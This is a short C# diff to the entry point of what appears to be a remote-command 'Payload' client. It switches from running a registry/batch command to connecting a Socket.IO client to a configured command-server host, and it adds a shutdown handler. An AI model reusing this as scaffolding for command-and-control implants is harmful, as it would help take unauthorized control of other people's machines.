@@ -4,11 +4,32 @@ using Payload.Command;
 using Payload.Command.SocketClient;
 using Payload.Core.Command;
 using SocketIOClient;
+using static CommonClassLibrary.Common.AppExitEvent;
 //await DemoTest();
 
-new RegistryKeyBatFactory().CreateCommand().Execute();
+var sc = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);
 
-//var sc = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);
+SetConsoleCtrlHandler((CtrlType signal) =>
+{
+    switch (signal)
+    {
+        case CtrlType.CTRL_BREAK_EVENT:
+        case CtrlType.CTRL_C_EVENT:
+        case CtrlType.CTRL_LOGOFF_EVENT:
+        case CtrlType.CTRL_SHUTDOWN_EVENT:
+        case CtrlType.CTRL_CLOSE_EVENT:
+            Console.WriteLine("Closing");
+            // TODO Cleanup resources
+            sc.StopClient();
+            Environment.Exit(0);
+            return false;
+
+        default:
+            return false;
+    }
+}, true);
+
+
 
 while (true)
 {
